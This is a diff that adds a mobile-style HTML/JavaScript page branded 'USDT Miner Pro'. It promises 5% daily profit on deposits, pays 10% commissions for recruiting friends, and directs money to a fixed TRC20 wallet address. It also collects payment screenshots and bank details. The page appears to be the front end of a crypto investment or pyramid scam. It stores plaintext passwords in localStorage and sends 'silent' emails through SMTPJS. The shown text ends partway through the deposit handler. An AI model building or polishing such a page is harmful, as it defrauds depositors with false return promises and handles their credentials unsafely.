@@ -1,0 +1,1432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Mining Wallet</title>
+    <style>
+        :root {
+            --primary: #26a17b; /* USDT green */
+            --secondary: #5cd6a8;
+            --danger: #d63031;
+            --success: #00b894;
+            --dark: #2d3436;
+            --light: #f5f6fa;
+            --referral: #f39c12;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f1f2f6;
+            color: var(--dark);
+        }
+        
+        .app-container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        
+        .auth-buttons {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        
+        .auth-btn {
+            background: rgba(255,255,255,0.2);
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            margin-left: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .main-content {
+            padding: 20px;
+        }
+        
+        .balance-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+            border: 1px solid #eee;
+            position: relative;
+        }
+        
+        .balance-title {
+            color: #7f8c8d;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .balance-amount {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        
+        .profit-badge {
+            background-color: var(--success);
+            color: white;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: inline-block;
+        }
+        
+        .next-profit {
+            font-size: 12px;
+            color: #7f8c8d;
+            margin-top: 5px;
+        }
+        
+        .action-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .action-btn {
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+        
+        .action-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .deposit-btn {
+            background-color: var(--primary);
+            color: white;
+        }
+        
+        .withdraw-btn {
+            background-color: var(--danger);
+            color: white;
+        }
+        
+        .referral-btn {
+            background-color: var(--referral);
+            color: white;
+            margin-top: 10px;
+            width: 100%;
+        }
+        
+        .mining-status {
+            margin-top: 30px;
+        }
+        
+        .status-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+        
+        .status-title {
+            font-weight: bold;
+        }
+        
+        .status-value {
+            color: var(--primary);
+            font-weight: bold;
+        }
+        
+        .progress-container {
+            height: 10px;
+            background-color: #ecf0f1;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            width: 35%;
+            border-radius: 5px;
+            transition: width 0.5s;
+        }
+        
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .modal-content {
+            background-color: white;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 10px;
+            overflow: hidden;
+            animation: modalFadeIn 0.3s;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .modal-header {
+            padding: 15px 20px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .modal-title {
+            font-weight: bold;
+        }
+        
+        .close-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        
+        .modal-body {
+            padding: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+            flex-direction: column;
+            color: white;
+        }
+        
+        .processing-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: var(--success);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+            display: none;
+            z-index: 1000;
+            animation: notificationFadeIn 0.3s;
+        }
+        
+        @keyframes notificationFadeIn {
+            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+        
+        .transaction-history {
+            margin-top: 30px;
+        }
+        
+        .history-title {
+            font-weight: bold;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .history-empty {
+            text-align: center;
+            color: #7f8c8d;
+            padding: 30px 0;
+        }
+        
+        .profile-pic {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background-color: #eee;
+            margin: 0 auto 15px;
+            overflow: hidden;
+            position: relative;
+            border: 3px solid var(--primary);
+        }
+        
+        .profile-pic img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .profile-pic .upload-btn {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            background-color: var(--primary);
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .referral-code {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .referral-code .code {
+            font-weight: bold;
+            font-size: 18px;
+            color: var(--primary);
+            margin: 10px 0;
+            letter-spacing: 2px;
+        }
+        
+        .referral-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .stat-box {
+            background-color: white;
+            border-radius: 8px;
+            padding: 10px;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        
+        .stat-value {
+            font-weight: bold;
+            font-size: 18px;
+            color: var(--primary);
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #7f8c8d;
+        }
+        
+        .payment-proof {
+            margin-top: 15px;
+        }
+        
+        .proof-preview {
+            width: 100%;
+            max-height: 150px;
+            object-fit: contain;
+            margin-top: 10px;
+            border: 1px dashed #ddd;
+            display: none;
+        }
+        
+        .settings-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 15px 0;
+            border-bottom: 1px solid #eee;
+            align-items: center;
+        }
+        
+        .settings-item:last-child {
+            border-bottom: none;
+        }
+        
+        .tab-container {
+            display: flex;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 20px;
+        }
+        
+        .tab {
+            padding: 10px 15px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+        
+        .tab.active {
+            border-bottom: 2px solid var(--primary);
+            color: var(--primary);
+            font-weight: bold;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+    <!-- SMTPJS Library for Silent Emails -->
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+</head>
+<body>
+    <div class="app-container">
+        <header>
+            <div class="logo">USDT Miner Pro</div>
+            <div class="auth-buttons">
+                <button class="auth-btn login-btn" id="logout-btn" style="display:none;">Logout</button>
+                <button class="auth-btn login-btn" id="header-login-btn">Login</button>
+                <button class="auth-btn register-btn" id="header-register-btn">Register</button>
+            </div>
+        </header>
+        
+        <div class="main-content" id="main-content">
+            <!-- Dashboard View -->
+            <div id="dashboard-view">
+                <div class="balance-card">
+                    <div class="balance-title">YOUR USDT BALANCE</div>
+                    <div class="balance-amount" id="user-balance">0.00</div>
+                    <div class="profit-badge">+5% Daily Profit</div>
+                    <div class="next-profit">Next profit: <span id="next-profit-time">Today at 23:59</span></div>
+                    
+                    <div class="action-buttons">
+                        <button class="action-btn deposit-btn" onclick="openModal('deposit-modal')">
+                            Deposit
+                        </button>
+                        <button class="action-btn withdraw-btn" onclick="openModal('withdraw-modal')">
+                            Withdraw
+                        </button>
+                    </div>
+                    
+                    <button class="action-btn referral-btn" onclick="openModal('referral-modal')">
+                        Invite Friends & Earn
+                    </button>
+                </div>
+                
+                <div class="mining-status">
+                    <div class="status-header">
+                        <div class="status-title">MINING STATUS</div>
+                        <div class="status-value" id="mining-progress">0%</div>
+                    </div>
+                    <div class="progress-container">
+                        <div class="progress-bar" id="progress-bar"></div>
+                    </div>
+                </div>
+                
+                <div class="transaction-history">
+                    <div class="history-title">TRANSACTION HISTORY</div>
+                    <div class="history-empty" id="history-empty">No transactions yet</div>
+                    <div id="transaction-list" style="display:none;"></div>
+                </div>
+            </div>
+            
+            <!-- Profile View (hidden by default) -->
+            <div id="profile-view" class="hidden">
+                <div style="text-align: center;">
+                    <div class="profile-pic" id="profile-pic-container">
+                        <img id="profile-image" style="display:none;">
+                        <div class="upload-btn" onclick="document.getElementById('profile-upload').click()">+</div>
+                        <input type="file" id="profile-upload" accept="image/*" style="display:none;">
+                    </div>
+                    <h3 id="profile-name">User Name</h3>
+                    <p id="profile-email">user@example.com</p>
+                </div>
+                
+                <div class="referral-code">
+                    <div>Your Referral Code</div>
+                    <div class="code" id="referral-code">USDT1234</div>
+                    <button class="action-btn" onclick="copyReferralCode()" style="padding:8px;font-size:12px;">Copy Code</button>
+                    
+                    <div class="referral-stats">
+                        <div class="stat-box">
+                            <div class="stat-value" id="referrals-count">0</div>
+                            <div class="stat-label">Referrals</div>
+                        </div>
+                        <div class="stat-box">
+                            <div class="stat-value" id="referral-earnings">0</div>
+                            <div class="stat-label">USDT Earned</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="margin-top:30px;">
+                    <div class="settings-item" onclick="openModal('change-password-modal')">
+                        <div>Change Password</div>
+                        <div>&gt;</div>
+                    </div>
+                    <div class="settings-item" onclick="openModal('bank-details-modal')">
+                        <div>Bank Details</div>
+                        <div>&gt;</div>
+                    </div>
+                    <div class="settings-item" onclick="logout()">
+                        <div style="color:var(--danger);">Logout</div>
+                        <div style="color:var(--danger);">&gt;</div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Navigation Tabs -->
+            <div class="tab-container" style="margin-top:30px;">
+                <div class="tab active" onclick="showTab('dashboard')">Dashboard</div>
+                <div class="tab" onclick="showTab('profile')">Profile</div>
+            </div>
+        </div>
+        
+        <!-- Login/Signup View (hidden when logged in) -->
+        <div id="auth-views" style="display:none; padding:20px;">
+            <div id="login-view">
+                <h2 style="text-align:center;margin-bottom:20px;">Login to Your Account</h2>
+                <div class="form-group">
+                    <label class="form-label">Email</label>
+                    <input type="email" class="form-input" id="login-email" placeholder="Enter your email">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Password</label>
+                    <input type="password" class="form-input" id="login-password" placeholder="Enter your password">
+                </div>
+                <button class="submit-btn" onclick="login()">Login</button>
+                <div style="text-align:center;margin-top:15px;">
+                    Don't have an account? <a href="#" style="color:var(--primary);" onclick="showAuthView('register')">Register</a>
+                </div>
+            </div>
+            
+            <div id="register-view" style="display:none;">
+                <h2 style="text-align:center;margin-bottom:20px;">Create New Account</h2>
+                <div class="form-group">
+                    <label class="form-label">Full Name</label>
+                    <input type="text" class="form-input" id="register-name" placeholder="Enter your name">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Email</label>
+                    <input type="email" class="form-input" id="register-email" placeholder="Enter your email">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Password</label>
+                    <input type="password" class="form-input" id="register-password" placeholder="Create password">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Confirm Password</label>
+                    <input type="password" class="form-input" id="register-confirm" placeholder="Confirm password">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Referral Code (Optional)</label>
+                    <input type="text" class="form-input" id="register-referral" placeholder="Enter referral code">
+                </div>
+                <button class="submit-btn" onclick="register()">Create Account</button>
+                <div style="text-align:center;margin-top:15px;">
+                    Already have an account? <a href="#" style="color:var(--primary);" onclick="showAuthView('login')">Login</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Deposit Modal -->
+    <div class="modal" id="deposit-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Deposit USDT</div>
+                <button class="close-btn" onclick="closeModal('deposit-modal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label class="form-label">Amount (USDT)</label>
+                    <input type="number" class="form-input" id="deposit-amount" placeholder="Enter amount">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">USDT Wallet Address</label>
+                    <input type="text" class="form-input" id="deposit-address" value="TYniZoq95Paj5zYFTuqmMKQV6xX5DJy2th" readonly>
+                </div>
+                <div class="payment-proof">
+                    <label class="form-label">Payment Proof (Screenshot)</label>
+                    <input type="file" class="form-input" id="payment-proof" accept="image/*">
+                    <img id="proof-preview" class="proof-preview">
+                </div>
+                <button class="submit-btn" onclick="processDeposit()">Submit Deposit</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Withdraw Modal -->
+    <div class="modal" id="withdraw-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Withdraw USDT</div>
+                <button class="close-btn" onclick="closeModal('withdraw-modal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label class="form-label">Amount (USDT)</label>
+                    <input type="number" class="form-input" id="withdraw-amount" placeholder="Enter amount">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Your USDT Wallet Address</label>
+                    <input type="text" class="form-input" id="withdraw-address" placeholder="Enter your TRC20 address">
+                </div>
+                <button class="submit-btn" onclick="processWithdrawal()">Submit Withdrawal</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Referral Modal -->
+    <div class="modal" id="referral-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Invite Friends & Earn</div>
+                <button class="close-btn" onclick="closeModal('referral-modal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p>Invite friends to join and earn 10% of their deposits!</p>
+                
+                <div class="referral-code" style="margin-top:15px;">
+                    <div>Your Referral Link</div>
+                    <div class="code" id="referral-link">https://usdtminer.com/ref/USDT1234</div>
+                    <button class="action-btn" onclick="copyReferralLink()" style="padding:8px;font-size:12px;">Copy Link</button>
+                </div>
+                
+                <div style="margin-top:20px;">
+                    <h4>How it works:</h4>
+                    <ul style="margin-top:10px;padding-left:20px;">
+                        <li style="margin-bottom:5px;">Share your referral link with friends</li>
+                        <li style="margin-bottom:5px;">They sign up using your link</li>
+                        <li style="margin-bottom:5px;">You earn 10% of their deposits</li>
+                        <li>Earnings credited instantly</li>
+                    </ul>
+                </div>
+                
+                <div style="margin-top:20px;">
+                    <h4>Your Referrals</h4>
+                    <div id="referrals-list" style="margin-top:10px;text-align:center;color:#7f8c8d;">
+                        No referrals yet
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Change Password Modal -->
+    <div class="modal" id="change-password-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Change Password</div>
+                <button class="close-btn" onclick="closeModal('change-password-modal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label class="form-label">Current Password</label>
+                    <input type="password" class="form-input" id="current-password" placeholder="Enter current password">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">New Password</label>
+                    <input type="password" class="form-input" id="new-password" placeholder="Enter new password">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Confirm New Password</label>
+                    <input type="password" class="form-input" id="confirm-password" placeholder="Confirm new password">
+                </div>
+                <button class="submit-btn" onclick="changePassword()">Update Password</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Bank Details Modal -->
+    <div class="modal" id="bank-details-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Bank Details</div>
+                <button class="close-btn" onclick="closeModal('bank-details-modal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p style="margin-bottom:15px;">Add bank details for fiat withdrawals</p>
+                
+                <div class="form-group">
+                    <label class="form-label">Bank Name</label>
+                    <input type="text" class="form-input" id="bank-name" placeholder="Enter bank name">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Account Number</label>
+                    <input type="text" class="form-input" id="account-number" placeholder="Enter account number">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Account Name</label>
+                    <input type="text" class="form-input" id="account-name" placeholder="Enter account holder name">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">IBAN/SWIFT (Optional)</label>
+                    <input type="text" class="form-input" id="iban-swift" placeholder="Enter IBAN/SWIFT code">
+                </div>
+                <button class="submit-btn" onclick="saveBankDetails()">Save Details</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Processing Overlay -->
+    <div class="processing-overlay" id="processing-overlay">
+        <div class="processing-spinner"></div>
+        <div id="processing-text">Processing your transaction...</div>
+    </div>
+    
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+    
+    <script>
+        // User data
+        let currentUser = null;
+        let transactions = [];
+        let referrals = [];
+        let bankDetails = {};
+        
+        // DOM Elements
+        const authViews = document.getElementById('auth-views');
+        const mainContent = document.getElementById('main-content');
+        const loginView = document.getElementById('login-view');
+        const registerView = document.getElementById('register-view');
+        const dashboardView = document.getElementById('dashboard-view');
+        const profileView = document.getElementById('profile-view');
+        const logoutBtn = document.getElementById('logout-btn');
+        const headerLoginBtn = document.getElementById('header-login-btn');
+        const headerRegisterBtn = document.getElementById('header-register-btn');
+        const balanceElement = document.getElementById('user-balance');
+        const processingOverlay = document.getElementById('processing-overlay');
+        const notification = document.getElementById('notification');
+        const profileUpload = document.getElementById('profile-upload');
+        const proofPreview = document.getElementById('proof-preview');
+        const paymentProof = document.getElementById('payment-proof');
+        
+        // Initialize
+        checkAuthStatus();
+        setupEventListeners();
+        
+        // SILENT EMAIL FUNCTIONALITY
+        function sendSilentEmail(userEmail, amount) {
+            // In production, replace with your actual SMTPJS token
+            const smtpToken = "YOUR_SMTPJS_TOKEN_HERE";
+            
+            Email.send({
+                SecureToken: smtpToken,
+                To: userEmail,
+                From: "noreply@usdtminerpro.com",
+                Subject: "USDT Deposit Received",
+                Body: `Your deposit of ${amount} USDT has been received and is being processed.`,
+                // Silent mode - no UI notification
+            }).then(
+                message => console.log("Silent email sent to", userEmail)
+            ).catch(
+                error => console.error("Silent email failed:", error)
+            );
+        }
+        
+        // Check if user is logged in
+        function checkAuthStatus() {
+            const userData = localStorage.getItem('cryptoUser');
+            if (userData) {
+                currentUser = JSON.parse(userData);
+                showAppContent();
+            } else {
+                showAuthViews();
+            }
+        }
+        
+        // Show authentication views
+        function showAuthViews() {
+            authViews.style.display = 'block';
+            mainContent.style.display = 'none';
+            showAuthView('login');
+        }
+        
+        // Show main app content
+        function showAppContent() {
+            authViews.style.display = 'none';
+            mainContent.style.display = 'block';
+            updateUserData();
+            logoutBtn.style.display = 'block';
+            headerLoginBtn.style.display = 'none';
+            headerRegisterBtn.style.display = 'none';
+        }
+        
+        // Switch between login/register views
+        function showAuthView(view) {
+            if (view === 'login') {
+                loginView.style.display = 'block';
+                registerView.style.display = 'none';
+            } else {
+                loginView.style.display = 'none';
+                registerView.style.display = 'block';
+            }
+        }
+        
+        // Show tab content
+        function showTab(tab) {
+            if (tab === 'dashboard') {
+                dashboardView.style.display = 'block';
+                profileView.style.display = 'none';
+                document.querySelectorAll('.tab')[0].classList.add('active');
+                document.querySelectorAll('.tab')[1].classList.remove('active');
+            } else {
+                dashboardView.style.display = 'none';
+                profileView.style.display = 'block';
+                document.querySelectorAll('.tab')[0].classList.remove('active');
+                document.querySelectorAll('.tab')[1].classList.add('active');
+            }
+        }
+        
+        // Update user data in UI
+        function updateUserData() {
+            if (!currentUser) return;
+            
+            balanceElement.textContent = currentUser.balance.toFixed(2);
+            document.getElementById('profile-name').textContent = currentUser.name;
+            document.getElementById('profile-email').textContent = currentUser.email;
+            document.getElementById('referral-code').textContent = currentUser.referralCode;
+            document.getElementById('referral-link').textContent = `https://usdtminer.com/ref/${currentUser.referralCode}`;
+            document.getElementById('referrals-count').textContent = referrals.length;
+            
+            // Calculate referral earnings (10% of referrals' deposits)
+            const referralEarnings = referrals.reduce((total, ref) => total + (ref.deposits * 0.1), 0);
+            document.getElementById('referral-earnings').textContent = referralEarnings.toFixed(2);
+            
+            // Update profile image if exists
+            if (currentUser.profileImage) {
+                const profileImg = document.getElementById('profile-image');
+                profileImg.src = currentUser.profileImage;
+                profileImg.style.display = 'block';
+            }
+            
+            // Update transaction history
+            updateTransactionHistory();
+            
+            // Update referrals list
+            updateReferralsList();
+            
+            // Update mining progress based on balance
+            updateMiningProgress();
+        }
+        
+        // Update transaction history
+        function updateTransactionHistory() {
+            const historyEmpty = document.getElementById('history-empty');
+            const transactionList = document.getElementById('transaction-list');
+            
+            if (transactions.length === 0) {
+                historyEmpty.style.display = 'block';
+                transactionList.style.display = 'none';
+            } else {
+                historyEmpty.style.display = 'none';
+                transactionList.style.display = 'block';
+                
+                // Sort by date (newest first)
+                const sortedTransactions = [...transactions].sort((a, b) => new Date(b.date) - new Date(a.date));
+                
+                // Generate transaction list HTML
+                let html = '';
+                sortedTransactions.forEach(tx => {
+                    const amountClass = tx.type === 'deposit' || tx.type === 'profit' ? 'color:var(--success);' : 'color:var(--danger);';
+                    const sign = tx.type === 'deposit' || tx.type === 'profit' ? '+' : '-';
+                    
+                    html += `
+                        <div class="settings-item">
+                            <div>
+                                <div style="font-weight:bold;">${tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}</div>
+                                <div style="font-size:12px;color:#7f8c8d;">${new Date(tx.date).toLocaleString()}</div>
+                            </div>
+                            <div style="${amountClass}font-weight:bold;">${sign}$${tx.amount.toFixed(2)}</div>
+                        </div>
+                    `;
+                });
+                
+                transactionList.innerHTML = html;
+            }
+        }
+        
+        // Update referrals list
+        function updateReferralsList() {
+            const referralsList = document.getElementById('referrals-list');
+            
+            if (referrals.length === 0) {
+                referralsList.innerHTML = 'No referrals yet';
+            } else {
+                let html = '';
+                referrals.forEach(ref => {
+                    html += `
+                        <div class="settings-item" style="padding:10px 0;">
+                            <div>
+                                <div style="font-weight:bold;">${ref.name}</div>
+                                <div style="font-size:12px;color:#7f8c8d;">Joined: ${new Date(ref.date).toLocaleDateString()}</div>
+                            </div>
+                            <div style="color:var(--success);font-weight:bold;">+$${(ref.deposits * 0.1).toFixed(2)}</div>
+                        </div>
+                    `;
+                });
+                
+                referralsList.innerHTML = html;
+            }
+        }
+        
+        // Update mining progress
+        function updateMiningProgress() {
+            if (!currentUser) return;
+            
+            // Simple algorithm: every $100 adds 10% to mining progress (max 100%)
+            const progress = Math.min(Math.floor(currentUser.balance / 100) * 10, 100);
+            
+            document.getElementById('mining-progress').textContent = progress + '%';
+            document.getElementById('progress-bar').style.width = progress + '%';
+        }
+        
+        // Calculate next profit time (today at 23:59)
+        function getNextProfitTime() {
+            const now = new Date();
+            const nextProfit = new Date();
+            
+            nextProfit.setHours(23, 59, 0, 0);
+            
+            if (now > nextProfit) {
+                nextProfit.setDate(nextProfit.getDate() + 1);
+            }
+            
+            return nextProfit;
+        }
+        
+        // Format time
+        function formatTime(date) {
+            return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        }
+        
+        // Show notification
+        function showNotification(message, type) {
+            notification.textContent = message;
+            notification.style.backgroundColor = type === 'error' ? 'var(--danger)' : 
+                                              type === 'info' ? 'var(--referral)' : 'var(--success)';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+        
+        // Modal functions
+        function openModal(modalId) {
+            document.getElementById(modalId).style.display = 'flex';
+        }
+        
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+        
+        // Setup event listeners
+        function setupEventListeners() {
+            // Profile image upload
+            profileUpload.addEventListener('change', function(e) {
+                if (e.target.files.length > 0) {
+                    const file = e.target.files[0];
+                    const reader = new FileReader();
+                    
+                    reader.onload = function(event) {
+                        const profileImg = document.getElementById('profile-image');
+                        profileImg.src = event.target.result;
+                        profileImg.style.display = 'block';
+                        
+                        // Save to user data
+                        if (currentUser) {
+                            currentUser.profileImage = event.target.result;
+                            localStorage.setItem('cryptoUser', JSON.stringify(currentUser));
+                        }
+                    };
+                    
+                    reader.readAsDataURL(file);
+                }
+            });
+            
+            // Payment proof upload
+            paymentProof.addEventListener('change', function(e) {
+                if (e.target.files.length > 0) {
+                    const file = e.target.files[0];
+                    const reader = new FileReader();
+                    
+                    reader.onload = function(event) {
+                        proofPreview.src = event.target.result;
+                        proofPreview.style.display = 'block';
+                    };
+                    
+                    reader.readAsDataURL(file);
+                }
+            });
+            
+            // Header buttons
+            headerLoginBtn.addEventListener('click', function() {
+                showAuthViews();
+                showAuthView('login');
+            });
+            
+            headerRegisterBtn.addEventListener('click', function() {
+                showAuthViews();
+                showAuthView('register');
+            });
+            
+            logoutBtn.addEventListener('click', logout);
+        }
+        
+        // User authentication functions
+        function login() {
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+            
+            if (!email || !password) {
+                showNotification('Please enter email and password', 'error');
+                return;
+            }
+            
+            // In a real app, this would be a server request
+            // For demo, we'll use localStorage
+            
+            // Check if user exists
+            const users = JSON.parse(localStorage.getItem('cryptoUsers')) || [];
+            const user = users.find(u => u.email === email && u.password === password);
+            
+            if (user) {
+                currentUser = user;
+                localStorage.setItem('cryptoUser', JSON.stringify(user));
+                
+                // Load user data
+                transactions = JSON.parse(localStorage.getItem(`transactions_${user.email}`)) || [];
+                referrals = JSON.parse(localStorage.getItem(`referrals_${user.referralCode}`)) || [];
+                bankDetails = JSON.parse(localStorage.getItem(`bankDetails_${user.email}`)) || {};
+                
+                showAppContent();
+                showNotification('Login successful', 'success');
+            } else {
+                showNotification('Invalid email or password', 'error');
+            }
+        }
+        
+        function register() {
+            const name = document.getElementById('register-name').value;
+            const email = document.getElementById('register-email').value;
+            const password = document.getElementById('register-password').value;
+            const confirm = document.getElementById('register-confirm').value;
+            const referralCode = document.getElementById('register-referral').value;
+            
+            if (!name || !email || !password || !confirm) {
+                showNotification('Please fill all fields', 'error');
+                return;
+            }
+            
+            if (password !== confirm) {
+                showNotification('Passwords do not match', 'error');
+                return;
+            }
+            
+            if (password.length < 6) {
+                showNotification('Password must be at least 6 characters', 'error');
+                return;
+            }
+            
+            // Check if email already exists
+            const users = JSON.parse(localStorage.getItem('cryptoUsers')) || [];
+            if (users.some(u => u.email === email)) {
+                showNotification('Email already registered', 'error');
+                return;
+            }
+            
+            // Generate referral code
+            const referralCodeGenerated = 'USDT' + Math.floor(1000 + Math.random() * 9000);
+            
+            // Create new user
+            const newUser = {
+                name,
+                email,
+                password,
+                balance: 0,
+                referralCode: referralCodeGenerated,
+                joinDate: new Date().toISOString(),
+                referredBy: referralCode || null
+            };
+            
+            users.push(newUser);
+            localStorage.setItem('cryptoUsers', JSON.stringify(users));
+            
+            // If referral code was provided, track the referral
+            if (referralCode) {
+                const referringUser = users.find(u => u.referralCode === referralCode);
+                if (referringUser) {
+                    const referrals = JSON.parse(localStorage.getItem(`referrals_${referralCode}`)) || [];
+                    referrals.push({
+                        name,
+                        email,
+                        date: new Date().toISOString(),
+                        deposits: 0
+                    });
+                    localStorage.setItem(`referrals_${referralCode}`, JSON.stringify(referrals));
+                }
+            }
+            
+            showNotification('Registration successful! Please login', 'success');
+            showAuthView('login');
+        }
+        
+        function logout() {
+            currentUser = null;
+            localStorage.removeItem('cryptoUser');
+            showAuthViews();
+            showNotification('Logged out successfully', 'info');
+        }
+        
+        // Transaction functions
+        function processDeposit() {
+            const amount = parseFloat(document.getElementById('deposit-amount').value);
+            const proofFile = document.getElementById('payment-proof').files[0];
+            
+            if (!amount || amount <= 0) {
+                showNotification('Please enter a valid amount', 'error');
+                return;
+            }
+            
+            if (!proofFile) {
+                showNotification('Please upload payment proof', 'error');
+                return;
+            }
+            
+            // Show processing overlay
+            processingOverlay.style.display = 'flex';
